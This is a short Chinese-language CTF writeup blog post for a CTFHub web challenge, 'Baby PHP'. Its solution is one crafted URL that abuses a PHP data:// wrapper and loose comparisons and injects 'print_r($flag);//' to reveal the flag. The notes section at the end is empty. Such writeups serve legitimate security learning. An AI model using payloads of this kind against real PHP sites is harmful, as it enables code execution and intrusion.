
---
layout: post
title: "CTFHub Writeup-Baby PHP"
date: 2026-09-16
categories: CTF
tags: [CTFHub, Web, 签到题]
---

# CTFHub Writeup - Baby PHP 

## 题目类型

WEB

## 题目描述

点击题目后，题目上会出现一行链接：

http://challenge-2023fdb5cd62f356.sandbox.ctfhub.com:10800/

## 解题过程

点开链接后分析并理解代码的意思

在搜索框中打入此链接：

http://challenge-35c68e07699bc08c.sandbox.ctfhub.com:10800/?msg=data://text/plain;base64,SGVsbG8gQ2hhbGxlbmdlIQ&key1=1337e0&key2=1337%EF%BC%84aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&cc[]=1234&k1=2&hack=k1&bb=print_r($flag);//

回车，就能找到正确的flag了

## 笔记

这道题主要学习了：

